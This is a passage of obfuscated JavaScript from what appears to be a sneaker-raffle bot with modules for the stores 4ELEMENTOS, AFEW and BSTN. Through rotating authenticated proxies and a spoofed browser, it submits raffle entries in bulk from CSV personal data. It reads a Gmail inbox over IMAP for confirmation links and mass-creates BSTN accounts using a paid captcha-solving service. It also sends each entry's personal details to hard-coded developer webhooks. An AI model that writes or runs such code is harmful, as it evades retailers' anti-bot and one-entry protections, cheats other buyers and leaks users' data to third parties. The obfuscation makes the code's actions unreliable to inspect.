                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x22f7f0[0x0] + ':' + _0x22f7f0[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            console['log'](_0x46d913() + '\x20[' + _0x28b9f5['name'] + ']\x20Task\x20' + (_0x2dfb1a + 0x1) + '\x20:\x20Getting\x20Session');
                            const _0x2241cc = await _0x5b6225['newPage']();
                            await _0x2241cc['authenticate']({
                                'username': '' + _0x22f7f0[0x2],
                                'password': '' + _0x22f7f0[0x3]
                            }), await _0x2241cc['setRequestInterception'](!![]), _0x2241cc['on']('request', _0x14d707 => {
                                _0x14d707['resourceType']() === 'image' || _0x14d707['resourceType']() === 'font' || _0x14d707['resourceType']() === 'media' ? _0x14d707['abort']() : _0x14d707['continue']();
                            }), await _0x2241cc['goto'](_0x330921[_0x2dfb1a]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x46d913() + '\x20[' + _0x28b9f5['name'] + ']\x20Task\x20' + (_0x2dfb1a + 0x1) + '\x20:\x20Starting\x20Entry'), await _0x2241cc['waitForSelector']('#accept-all-gdpr'), await _0x2241cc['click']('#accept-all-gdpr'), await _0x2241cc['waitForSelector']('#raffles-product'), await _0x63444f(0x3e8), await _0x2241cc['$eval']('#raffles-product', _0x5b51b5 => _0x5b51b5['click']()), await _0x63444f(0x1388), await _0x2241cc['waitForSelector']('.fancybox-inner\x20>\x20iframe');
                            var _0x4c4b82 = await _0x2241cc['$']('.fancybox-inner\x20>\x20iframe'), _0x472447 = await _0x4c4b82['contentFrame']();
                            console['log'](_0x46d913() + '\x20[' + _0x28b9f5['name'] + ']\x20Task\x20' + (_0x2dfb1a + 0x1) + '\x20:\x20Checking\x20Information'), await _0x472447['waitForSelector']('input[name=\x22sm-form-email\x22]'), await _0x63444f(0x1f4), await _0x472447['type']('input[name=\x22sm-form-email\x22]', _0x330921[_0x2dfb1a]['Email']), await _0x63444f(0xc8), await _0x472447['type']('input[name=\x22sm-form-name\x22]', _0x330921[_0x2dfb1a]['FirstName'] + '\x20' + _0x330921[_0x2dfb1a]['LastName']), await _0x63444f(0xc8), await _0x472447['type']('input[name=\x22sm-form-street\x22]', _0x330921[_0x2dfb1a]['Address1'] + '\x20' + _0x330921[_0x2dfb1a]['HouseNumber'] + '\x20' + _0x330921[_0x2dfb1a]['Address2']), await _0x63444f(0xc8), await _0x472447['type']('input[name=\x22sm-form-city\x22]', _0x330921[_0x2dfb1a]['City']), await _0x63444f(0xc8), await _0x472447['type']('input[name=\x22sm-form-province\x22]', _0x330921[_0x2dfb1a]['State']), await _0x63444f(0xc8), await _0x472447['type']('input[name=\x22sm-form-zip\x22]', _0x330921[_0x2dfb1a]['Zip']), await _0x63444f(0xc8), await _0x472447['type']('input[name=\x22sm-form-country\x22]', _0x330921[_0x2dfb1a]['Country']), await _0x63444f(0xc8), await _0x472447['type']('input[name=\x22sm-form-phone\x22]', _0x330921[_0x2dfb1a]['Phone']), await _0x63444f(0xc8), await _0x472447['type']('input[name=\x22sm-cst.instagram_user\x22]', _0x330921[_0x2dfb1a]['Follower']), await _0x63444f(0xc8), await _0x472447['type']('input[name=\x22sm-cst.size\x22]', _0x330921[_0x2dfb1a]['Size']), await _0x63444f(0x1f4), await _0x472447['click']('.icheckbox_simple-custom.icheckbox--CONSENT'), await _0x63444f(0x1f4), await _0x472447['click']('.icheckbox_simple-custom'), await _0x63444f(0x1f4), console['log'](_0x46d913() + '\x20[' + _0x28b9f5['name'] + ']\x20Task\x20' + (_0x2dfb1a + 0x1) + '\x20:\x20Sending\x20Request'), await _0x472447['$eval']('form', _0x9426e2 => _0x9426e2['submit']()), console['log'](_0x580fd6['green'](_0x46d913() + '\x20[' + _0x28b9f5['name'] + ']\x20Task\x20' + (_0x2dfb1a + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x1ba657 = '';
                            var _0x385780 = await _0x4d9326(_0x330921[_0x2dfb1a], _0x28b9f5, 'dev', ![]), _0x2d7fcf = await _0x4d9326(_0x330921[_0x2dfb1a], _0x28b9f5, 'pub', ![]);
                            const _0x4a758b = {
                                'succesDEVMSG': { 'embeds': [_0x385780] },
                                'succesPUBMSG': { 'embeds': [_0x2d7fcf] }
                            };
                            try {
                                _0xb4964b['webhook'] != undefined && _0xb4964b['webhook'] != '' && await _0x584f8b(_0xb4964b['webhook'], _0x4a758b['succesDEVMSG']), await _0x63444f(0xc8), await _0x584f8b(_0xe17ea3, _0x4a758b['succesDEVMSG']), await _0x63444f(0xc8), await _0x584f8b(_0x3501b6, _0x4a758b['succesPUBMSG']);
                            } catch (_0x2c227b) {
                                console['log'](_0x580fd6['yellow'](_0x46d913() + '\x20[' + _0x28b9f5['name'] + ']\x20Task\x20' + (_0x2dfb1a + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x2c227b));
                            }
                        } catch (_0x12f595) {
                            console['log'](_0x580fd6['red'](_0x46d913() + '\x20[' + _0x28b9f5['name'] + ']\x20Task\x20' + (_0x2dfb1a + 0x1) + '\x20:\x20' + _0x12f595)), _0x53c83a = '' + _0x12f595;
                            var _0x4f3042 = await _0x4d9326(_0x330921[_0x2dfb1a], _0x28b9f5, 'dev', !![], _0x53c83a), _0x385780 = await _0x4d9326(_0x330921[_0x2dfb1a], _0x28b9f5, 'dev', ![]), _0x2d7fcf = await _0x4d9326(_0x330921[_0x2dfb1a], _0x28b9f5, 'pub', ![]);
                            const _0x2134aa = {
                                'succesDEVMSG': { 'embeds': [_0x385780] },
                                'succesPUBMSG': { 'embeds': [_0x2d7fcf] }
                            };
                            _0x2134aa['errorDEV'] = { 'embeds': [_0x4f3042] }, _0xb4964b['webhook'] != undefined && _0xb4964b['webhook'] != '' && await _0x584f8b(_0xb4964b['webhook'], _0x2134aa['errorDEV']), await _0x584f8b(_0x437fba, _0x2134aa['errorDEV']), _0x12f595 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x1ba657 = 'yes');
                        } finally {
                            _0x5b6225['close']();
                            if (_0x1ba657 == 'yes' && _0x122c9d != 0x5 && _0x53c83a != 'Size\x20Not\x20Found') {
                                console['log'](_0x580fd6['red'](_0x46d913() + '\x20[' + _0x28b9f5['name'] + ']\x20Task\x20' + (_0x2dfb1a + 0x1) + '\x20:\x20Retrying')), _0x2dfb1a = _0x2dfb1a - 0x1, _0x122c9d = _0x122c9d + 0x1;
                                continue;
                            }
                            _0x1ba657 == 'yes' && _0x122c9d >= 0x5 && (_0x1d0bc0(_0x330921[_0x2dfb1a], _0x28b9f5), _0x1ba657 = 'no', _0x122c9d = 0x0), console['log'](_0x46d913() + '\x20[' + _0x28b9f5['name'] + ']\x20Waiting\x20for\x20' + _0xb4964b['delay'] + '\x20ms'), await _0x63444f(_0xb4964b['delay']);
                        }
                    }
                }
            },
            {
                'name': '4ELEMENTOS\x20Link\x20Verification',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x5a75cc, _0x63fad9) {
                    var _0x58bbf0 = [];
                    async function _0x58139f() {
                        var _0x41f6ca = new _0x2021ac({
                            'user': _0xb4964b['masterMail'],
                            'password': _0xb4964b['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x4157e8(_0x453bf2) {
                            _0x41f6ca['openBox']('INBOX', ![], _0x453bf2);
                        }
                        _0x41f6ca['once']('ready', function () {
                            _0x4157e8(function (_0x188876, _0xb0ddb5) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x188876)
                                    throw _0x188876;
                                _0x41f6ca['seq']['search'](['UNSEEN'], function (_0x568ba4, _0x5c8709) {
                                    if (!_0x5c8709 || !_0x5c8709['length'])
                                        console['log'](_0x46d913() + '\x20[' + _0x5a75cc['name'] + ']\x20No\x20mails\x20found'), _0x41f6ca['end']();
                                    else {
                                        var _0x47ebad = _0x41f6ca['seq']['fetch'](_0x5c8709, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x47ebad['on']('message', function (_0x28bffe, _0x4f317d) {
                                            var _0x2b3844 = '(#' + _0x4f317d + ')\x20';
                                            _0x28bffe['on']('body', function (_0xea5b3a, _0x1e8875) {
                                                _0x22cc54(_0xea5b3a, (_0x5d6141, _0x3d2406) => {
                                                    if (_0x3d2406['subject'] == 'Confirm\x20your\x20subscription\x20to\x20the\x20Raffle\x20||\x20Confirma\x20tu\x20suscripción\x20al\x20Raffle') {
                                                        var _0x38b276 = _0x3d2406['html']['split']('\x0a');
                                                        for (var _0x4b5c33 = 0x0; _0x4b5c33 < _0x38b276['length']; _0x4b5c33++) {
                                                            if (_0x38b276[_0x4b5c33]['includes']('salesmanago') && _0x38b276[_0x4b5c33]['includes']('<td') && _0x38b276[_0x4b5c33]['includes']('href')) {
                                                                var _0x5d591d = _0x38b276[_0x4b5c33]['split']('href=\x22'), _0x3b96cf = _0x5d591d[0x1]['split']('\x22')[0x0];
                                                                _0x58bbf0['push'](_0x3b96cf);
                                                                break;
                                                            }
                                                        }
                                                    }
                                                });
                                            }), _0x28bffe['once']('end', function () {
                                            });
                                        }), _0x47ebad['once']('error', function (_0x2ff47a) {
                                            console['log']('Fetch\x20error:\x20' + _0x2ff47a);
                                        }), _0x47ebad['once']('end', function () {
                                            _0x41f6ca['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x41f6ca['once']('error', function (_0x42f02f) {
                            console['log'](_0x580fd6['red'](_0x42f02f['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
                        }), _0x41f6ca['once']('end', async function () {
                        }), _0x41f6ca['connect']();
                    }
                    async function _0x2a1bad(_0x4a3bf0, _0x303569, _0x26b1d0) {
                        for (var _0x1e47c0 = 0x0; _0x1e47c0 < _0x303569['length']; _0x1e47c0++) {
                            async function _0x3e4932(_0x56bffa, _0x219e2f, _0x5e2307, _0xf596e2, _0x5da789) {
                                var _0x570842, _0xf3b938 = {}, _0x563228 = [], _0x4c16fe = {}, _0x372f72 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x2eb9fd = Math['round'](Math['random']() * (_0x372f72['length'] - 0x1));
                                _0xf596e2[_0x56bffa]['Size'] == 'RANDOM' && (_0xf596e2[_0x56bffa]['Size'] = _0x372f72[_0x2eb9fd]);
                                !_0xf596e2 && (_0xf596e2 = {});
                                if (_0xb4964b['useRandomProxy'] = ![])
                                    var _0x285ccf = _0x5da789[_0x56bffa]['split'](':');
                                else
                                    var _0x3104fb = Math['round'](Math['random']() * (_0x5da789['length'] - 0x1)), _0x285ccf = _0x5da789[_0x3104fb]['split'](':');
                                var _0x209918 = {
                                    'jar': _0x3aae82,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x5e2307['url'],
                                    'headers': _0x5e2307['headers'],
                                    'body': JSON['stringify'](_0xf3b938),
                                    'proxy': 'http://' + _0x285ccf[0x2] + ':' + _0x285ccf[0x3] + '@' + _0x285ccf[0x0] + ':' + _0x285ccf[0x1]
                                };
                                return _0x219e2f != 'ver' && (_0x209918['url'] = _0x5e2307['url'], _0x209918['headers'] = _0x5e2307['headers']), _0x219e2f == 'ver' && (_0x209918['method'] = 'GET', _0x209918['url'] = _0xf596e2[_0x56bffa]), new Promise(function (_0x465fb2, _0x4b9ffd) {
                                    callback = async (_0x362c28, _0x1f0bb2, _0x208a87) => {
                                        if (!_0x362c28 && _0x1f0bb2['statusCode'] == 0xca || !_0x362c28 && _0x1f0bb2['statusCode'] == 0xc8) {
                                            if (_0x219e2f != 'ver') {
                                                var _0x57352b = await _0x4d9326(_0xf596e2[_0x56bffa], _0x5e2307, 'dev', ![]), _0x3bf7f7 = await _0x4d9326(_0xf596e2[_0x56bffa], _0x5e2307, 'pub', ![]);
                                                const _0x465d29 = {
                                                    'succesDEVMSG': { 'embeds': [_0x57352b] },
                                                    'succesPUBMSG': { 'embeds': [_0x3bf7f7] }
                                                };
                                                if (_0xb4964b['webhook'] != undefined && _0xb4964b['webhook'] != '')
                                                    try {
                                                        await _0x584f8b(_0xb4964b['webhook'], _0x465d29['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x63444f(0xc8), await _0x584f8b(_0xe17ea3, _0x465d29['succesDEVMSG']), await _0x63444f(0xc8);
                                                try {
                                                    await _0x584f8b(_0x3501b6, _0x465d29['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0xa2d2c6(_0xf596e2[_0x56bffa], _0x5e2307);
                                            }
                                            _0x465fb2(console['log'](_0x580fd6['green'](_0x46d913() + '\x20[' + _0x5e2307['name'] + ']\x20Task\x20' + (_0x56bffa + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x219e2f != 'ver') {
                                                var _0x3d87dc = '' + _0x362c28, _0x5081f5 = await _0x4d9326(_0xf596e2[_0x56bffa], _0x5e2307, 'dev', !![], _0x3d87dc), _0x2d8613 = {};
                                                _0x2d8613['errorDEV'] = { 'embeds': [_0x5081f5] }, _0x1d0bc0(_0xf596e2[_0x56bffa], _0x5e2307), _0xb4964b['webhook'] != undefined && _0xb4964b['webhook'] != '' && await _0x584f8b(_0xb4964b['webhook'], _0x2d8613['errorDEV']), await _0x584f8b(_0x437fba, _0x2d8613['errorDEV']);
                                            }
                                            _0x4b9ffd(console['log'](_0x580fd6['red'](_0x46d913() + '\x20[' + _0x5e2307['name'] + ']\x20Task\x20' + (_0x56bffa + 0x1) + ':\x20' + _0x362c28)));
                                        }
                                    };
                                    try {
                                        _0x219e2f != 'ver' ? console['log'](_0x46d913() + '\x20[' + _0x5e2307['name'] + ']\x20Task\x20' + (_0x56bffa + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0xf3b938['data']['attributes']['email']) : console['log'](_0x46d913() + '\x20[' + _0x5e2307['name'] + ']\x20Task\x20' + (_0x56bffa + 0x1) + ':\x20Fetching\x20Response'), _0x15bdb0(_0x209918, callback);
                                    } catch (_0x4d4c2c) {
                                        console['log'](_0x46d913() + '\x20Task\x20' + (_0x56bffa + 0x1) + ':\x20' + _0x4d4c2c);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x3e4932(_0x1e47c0, 'ver', _0x4a3bf0, _0x303569, _0x26b1d0), console['log'](_0x46d913() + '\x20[' + _0x4a3bf0['name'] + ']\x20Sleeping\x20for\x20' + _0xb4964b['delay'] + '\x20ms'), await _0x63444f(_0xb4964b['delay']);
                            } catch (_0x2f7ef5) {
                            }
                        }
                    }
                    try {
                        _0x58139f(), await _0x63444f(0xfa0), console['log']('Found\x20' + _0x58bbf0['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x2a1bad(_0x5a75cc, _0x58bbf0, _0x63fad9);
                }
            }
        ]
    },
    {
        'name': 'AFEW\x20Store',
        'modules': [{
            'name': 'AFEW\x20Raffle\x20Entries',
            'store': 'AFEW',
            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png',
            'function': async function (_0x501fbb, _0x354301, _0x3b3474) {
                for (var _0x5cb01d = 0x0; _0x5cb01d < _0x354301['length']; _0x5cb01d++) {
                    _0xb4964b['AfewDelay'] = _0xb4964b['delay'];
                    var _0x327804;
                    if (_0x400d15 != 'yes')
                        var _0x400d15 = '', _0x35bb1f = 0x0;
                    var _0x53a7e3 = _0x354301[_0x5cb01d]['Url'];
                    _0x40199d(_0x501fbb['name'] + '\x20Task\x20' + (_0x5cb01d + 0x1) + '\x20/\x20' + _0x354301['length'] + '\x20||\x20File:\x20' + _0xbb8708 + '\x20Proxies:\x20' + _0x5c29ec), await _0x1713f8(_0x354301, _0x5cb01d);
                    var _0x4303e8 = await _0x4d9326(_0x354301[_0x5cb01d], _0x501fbb, 'dev', ![]), _0x50b869 = await _0x4d9326(_0x354301[_0x5cb01d], _0x501fbb, 'pub', ![]);
                    const _0x212e39 = {
                        'succesDEVMSG': { 'embeds': [_0x4303e8] },
                        'succesPUBMSG': { 'embeds': [_0x50b869] }
                    };
                    if (_0x354301[_0x5cb01d]['Email'] == '' || _0x354301[_0x5cb01d]['FirstName'] == '' || _0x354301[_0x5cb01d]['LastName'] == '' || _0x354301[_0x5cb01d]['Country'] == '' || _0x354301[_0x5cb01d]['Size'] == '' || _0x354301[_0x5cb01d]['Address1'] == '' || _0x354301[_0x5cb01d]['Zip'] == '') {
                        console['log'](_0x46d913() + '\x20[' + _0x501fbb['name'] + ']\x20Task\x20' + (_0x5cb01d + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0xb4964b['useRandomProxy'] = ![])
                        var _0x51a6ce = _0x3b3474[_0x5cb01d]['split'](':');
                    else
                        var _0x3ff173 = Math['round'](Math['random']() * (_0x3b3474['length'] - 0x1)), _0x51a6ce = _0x3b3474[_0x3ff173]['split'](':');
                    const _0x5e1992 = await _0x5e99b4['launch']({
                        'headless': !![],
                        'args': [
                            '--proxy-server=' + _0x51a6ce[0x0] + ':' + _0x51a6ce[0x1],
                            '--no-sandbox',
                            '--disable-setuid-sandbox'
                        ]
                    });
                    try {
                        const _0x32fc2e = await _0x5e1992['newPage']();
                        await _0x32fc2e['setDefaultNavigationTimeout'](0x1d4c0), await _0x32fc2e['authenticate']({
                            'username': '' + _0x51a6ce[0x2],
                            'password': '' + _0x51a6ce[0x3]
                        }), console['log'](_0x46d913() + '\x20[' + _0x501fbb['name'] + ']\x20Task\x20' + (_0x5cb01d + 0x1) + '\x20:\x20Getting\x20Session'), await _0x32fc2e['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x32fc2e['setRequestInterception'](!![]), _0x32fc2e['on']('request', _0x5918d5 => {
                            _0x5918d5['resourceType']() === 'image' || _0x5918d5['resourceType']() === 'font' || _0x5918d5['resourceType']() === 'media' ? _0x5918d5['abort']() : _0x5918d5['continue']();
                        }), await _0x32fc2e['goto'](_0x53a7e3, { 'waitUntil': 'networkidle2' }), console['log'](_0x46d913() + '\x20[' + _0x501fbb['name'] + ']\x20Task\x20' + (_0x5cb01d + 0x1) + '\x20:\x20Gathering\x20cookies'), await _0x32fc2e['waitForTimeout'](0xfa0), console['log'](_0x46d913() + '\x20[' + _0x501fbb['name'] + ']\x20Task\x20' + (_0x5cb01d + 0x1) + '\x20:\x20Cookies\x20received'), await _0x32fc2e['waitForTimeout'](0x320);
                        if (_0x354301[_0x5cb01d]['Size'] == 'RANDOM') {
                            console['log'](_0x46d913() + '\x20[' + _0x501fbb['name'] + ']\x20Task\x20' + (_0x5cb01d + 0x1) + '\x20:\x20Choosing\x20random\x20size');
                            const _0x22c6bb = await _0x32fc2e['$$eval']('div.size-picker.mt-2\x20>\x20ul\x20>\x20li\x20>\x20a', _0x4fcb2d => {
                                return _0x4fcb2d['map'](_0x44ce21 => _0x44ce21['href']);
                            });
                            var _0x2f7bc6 = Math['round'](Math['random']() * (_0x22c6bb['length'] - 0x1));
                            await _0x32fc2e['goto']('' + _0x22c6bb[_0x2f7bc6]);
                        } else {
                            console['log'](_0x46d913() + '\x20[' + _0x501fbb['name'] + ']\x20Task\x20' + (_0x5cb01d + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x354301[_0x5cb01d]['Size']);
                            try {
                                const _0x36ed57 = await _0x32fc2e['$$eval']('li[data-original-title=\x22Größe\x20in\x20EU:\x20' + _0x354301[_0x5cb01d]['Size'] + '\x22]\x20>\x20a', _0x548919 => {
                                    return _0x548919['map'](_0x1cfcf5 => _0x1cfcf5['href']);
                                });
                                await _0x32fc2e['goto']('' + _0x36ed57[0x0], { 'waitUntil': 'networkidle2' });
                            } catch (_0x5257d2) {
                                console['log'](_0x580fd6['red'](_0x46d913() + '\x20[' + _0x501fbb['name'] + ']\x20Task\x20' + (_0x5cb01d + 0x1) + '\x20:\x20' + _0x5257d2 + '\x20Size\x20not\x20found')), _0x327804 = 'Size\x20Not\x20Found';
                                var _0x30c6b3 = await _0x4d9326(_0x354301[_0x5cb01d], _0x501fbb, 'dev', !![], _0x327804);
                                _0x212e39['errorDEV'] = { 'embeds': [_0x30c6b3] };
                                _0xb4964b['webhook'] != undefined && _0xb4964b['webhook'] != '' && await _0x584f8b(_0xb4964b['webhook'], _0x212e39['errorDEV']);
                                await _0x584f8b(_0x437fba, _0x212e39['errorDEV']);
                                continue;
                            }
                        }
                        await _0x32fc2e['waitForTimeout'](0x258), await _0x32fc2e['type']('#raffle-instagram', '' + _0x354301[_0x5cb01d]['Follower'], { 'delay': 0x64 }), await _0x32fc2e['waitForTimeout'](0x384), await _0x32fc2e['click']('#raffle-terms'), await _0x32fc2e['waitForTimeout'](0x384), await _0x32fc2e['evaluate'](() => {
                            const _0x357b3c = document['querySelector']('button.btn[name=\x27add\x27]');
                            _0x357b3c['click']();
                        }), await _0x32fc2e['waitForTimeout'](0xbb8), await _0x32fc2e['waitForSelector']('#checkout_email'), await _0x63444f(0x3e8), console['log'](_0x46d913() + '\x20[' + _0x501fbb['name'] + ']\x20Task\x20' + (_0x5cb01d + 0x1) + '\x20:\x20Filling\x20Information'), await _0x32fc2e['type']('#checkout_email', '' + _0x354301[_0x5cb01d]['Email'], 0x32), await _0x63444f(0x320), await _0x32fc2e['select']('#checkout_shipping_address_country', '' + _0x354301[_0x5cb01d]['Country']), await _0x32fc2e['waitForTimeout'](0x258), await _0x32fc2e['type']('#checkout_shipping_address_first_name', '' + _0x354301[_0x5cb01d]['FirstName']), await _0x32fc2e['waitForTimeout'](0x320), await _0x32fc2e['type']('#checkout_shipping_address_last_name', '' + _0x354301[_0x5cb01d]['LastName']), await _0x32fc2e['waitForTimeout'](0x2bc), await _0x32fc2e['type']('#checkout_shipping_address_address1', _0x354301[_0x5cb01d]['Address1'] + '\x20' + _0x354301[_0x5cb01d]['HouseNumber']), await _0x32fc2e['waitForTimeout'](0x2bc), await _0x32fc2e['type']('#checkout_shipping_address_address2', '' + _0x354301[_0x5cb01d]['Address2']), await _0x32fc2e['waitForTimeout'](0x2bc);
                        _0x354301[_0x5cb01d]['Postcode'] == undefined ? await _0x32fc2e['type']('#checkout_shipping_address_zip', '' + _0x354301[_0x5cb01d]['Zip']) : await _0x32fc2e['type']('#checkout_shipping_address_zip', '' + _0x354301[_0x5cb01d]['Postcode']);
                        await _0x32fc2e['waitForTimeout'](0x2bc), await _0x32fc2e['type']('#checkout_shipping_address_city', '' + _0x354301[_0x5cb01d]['City']), await _0x32fc2e['waitForTimeout'](0x2bc), console['log'](_0x46d913() + '\x20[' + _0x501fbb['name'] + ']\x20Task\x20' + (_0x5cb01d + 0x1) + '\x20:\x20Getting\x20Shipping'), await _0x32fc2e, _0x32fc2e['evaluate'](() => {
                            const _0x2b0be1 = document['querySelector']('#continue_button');
                            for (var _0x40bace = 0x0; _0x40bace < 0x5; _0x40bace++) {
                                if (_0x2b0be1) {
                                    _0x2b0be1['click'](), _0x2b0be1['click']();
                                    break;
                                } else
                                    _0x63444f(0xfa0);
                            }
                        }), await _0x32fc2e['waitForTimeout'](0x1194);
                        try {
                            await _0x32fc2e['waitForSelector']('div.radio-wrapper', { 'timeout': 0x186a0 });
                        } catch {
                            console['log'](_0x580fd6['red'](_0x46d913() + '\x20[' + _0x501fbb['name'] + ']\x20Task\x20' + (_0x5cb01d + 0x1) + '\x20:\x20Proxy\x20Error'));
                            continue;
                        }
                        _0x32fc2e['evaluate'](() => {
                            const _0x27c50b = document['querySelector']('#continue_button');
                            for (var _0x446677 = 0x0; _0x446677 < 0x5; _0x446677++) {
                                if (_0x27c50b) {
                                    _0x27c50b['click']();
                                    break;
                                } else
                                    _0x63444f(0xfa0);
                            }
                        }), await _0x32fc2e['waitForTimeout'](0x7d0), console['log'](_0x46d913() + '\x20[' + _0x501fbb['name'] + ']\x20Task\x20' + (_0x5cb01d + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x32fc2e['waitForSelector']('#continue_button', { 'timeout': 0x186a0 }), _0x32fc2e['evaluate'](() => {
                            const _0x16550e = document['querySelector']('#continue_button');
                            for (var _0x11aa21 = 0x0; _0x11aa21 < 0x5; _0x11aa21++) {
                                if (_0x16550e) {
                                    _0x16550e['click']();
                                    break;
                                } else
                                    _0x63444f(0xfa0);
                            }
                        }), await _0x32fc2e['waitForTimeout'](0x1194), await _0x32fc2e['waitForSelector']('#continue_button'), _0x32fc2e['evaluate'](() => {
                            const _0x4e4505 = document['querySelector']('#continue_button');
                            for (var _0xb839d7 = 0x0; _0xb839d7 < 0x5; _0xb839d7++) {
                                if (_0x4e4505) {
                                    _0x4e4505['click']();
                                    break;
                                } else
                                    _0x63444f(0xfa0);
                            }
                        });
                        try {
                            await _0x32fc2e['waitForSelector']('div[data-step=\x22thank_you\x22]'), _0x400d15 = 'no', _0xa2d2c6(_0x354301[_0x5cb01d], _0x501fbb), console['log'](_0x580fd6['green'](_0x46d913() + '\x20[' + _0x501fbb['name'] + ']\x20Task\x20' + (_0x5cb01d + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            if (_0xb4964b['webhook'] != undefined && _0xb4964b['webhook'] != '')
                                try {
                                    await _0x584f8b(_0xb4964b['webhook'], _0x212e39['succesDEVMSG']);
                                } catch {
                                }
                            await _0x63444f(0xc8), await _0x584f8b(_0xe17ea3, _0x212e39['succesDEVMSG']), await _0x63444f(0xc8);
                            try {
                                await _0x584f8b(_0x3501b6, _0x212e39['succesPUBMSG']);
                            } catch {
                            }
                        } catch (_0x48add4) {
                            console['log'](_0x580fd6['red'](_0x46d913() + '\x20[' + _0x501fbb['name'] + ']\x20Task\x20' + (_0x5cb01d + 0x1) + '\x20:\x20Entry\x20Failed:\x20' + _0x48add4));
                        }
                    } catch (_0x72540e) {
                        console['log'](_0x580fd6['red'](_0x46d913() + '\x20[' + _0x501fbb['name'] + ']\x20Task\x20' + (_0x5cb01d + 0x1) + '\x20:\x20' + _0x72540e)), _0x327804 = '' + _0x72540e;
                        var _0x30c6b3 = await _0x4d9326(_0x354301[_0x5cb01d], _0x501fbb, 'dev', !![], _0x327804);
                        _0x212e39['errorDEV'] = { 'embeds': [_0x30c6b3] }, _0xb4964b['webhook'] != undefined && _0xb4964b['webhook'] != '' && await _0x584f8b(_0xb4964b['webhook'], _0x212e39['errorDEV']), await _0x584f8b(_0x437fba, _0x212e39['errorDEV']), _0x400d15 = 'yes';
                    } finally {
                        _0x5e1992 && _0x5e1992['close']();
                        if (_0x400d15 == 'yes' && _0x35bb1f != 0x5 && _0x327804 != 'Size\x20Not\x20Found') {
                            console['log'](_0x580fd6['red'](_0x46d913() + '\x20[' + _0x501fbb['name'] + ']\x20Task\x20' + (_0x5cb01d + 0x1) + '\x20:\x20Retrying')), _0x5cb01d = _0x5cb01d - 0x1, _0x35bb1f = _0x35bb1f + 0x1;
                            continue;
                        }
                        _0x400d15 == 'yes' && _0x35bb1f >= 0x5 && (_0x1d0bc0(_0x354301[_0x5cb01d], _0x501fbb), _0x400d15 = 'no', _0x35bb1f = 0x0);
                        if (_0x5cb01d + 0x1 == _0x354301['length']) {
                            await _0x63444f(0x7d0);
                            break;
                        }
                        console['log']('Waiting\x20for\x20' + _0xb4964b['AfewDelay'] + '\x20ms'), await _0x63444f(_0xb4964b['AfewDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'BSTN',
        'modules': [
            {
                'name': 'BSTN\x20Account\x20Generator',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x45b13b, _0x1f1f85, _0x518c76) {
                    _0x5e99b4['use'](_0x352eb4()), _0x5e99b4['use'](_0x231db9({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0xb4964b['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x56309d = 0x0; _0x56309d < _0x1f1f85['length']; _0x56309d++) {
                        if (_0x574eec != 'yes')
                            var _0x574eec = '', _0x2c4474 = 0x0;
                        var _0x14cf78;
                        await _0x1713f8(_0x1f1f85, _0x56309d), _0x40199d(_0x45b13b['name'] + '\x20Task\x20' + (_0x56309d + 0x1) + '\x20/\x20' + _0x1f1f85['length'] + '\x20||\x20File:\x20' + _0xbb8708 + '\x20Proxies:\x20' + _0x5c29ec);
                        var _0x2bef38 = await _0x4d9326(_0x1f1f85[_0x56309d], _0x45b13b, 'acc', ![]);
                        const _0x48e401 = { 'succesDEVMSG': { 'embeds': [_0x2bef38] } }, _0x200448 = 'https://www.bstn.com/eu_en/customer/account/create/';
                        var _0x24cb8f = Math['round'](Math['random']() * (_0x518c76['length'] - 0x1)), _0x26bd6c = _0x518c76[_0x24cb8f]['split'](':');
                        const _0x1a4960 = await _0x5e99b4['launch']({
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x26bd6c[0x0] + ':' + _0x26bd6c[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x594a30 = await _0x1a4960['newPage']();
                            await _0x594a30['authenticate']({
                                'username': '' + _0x26bd6c[0x2],
                                'password': '' + _0x26bd6c[0x3]
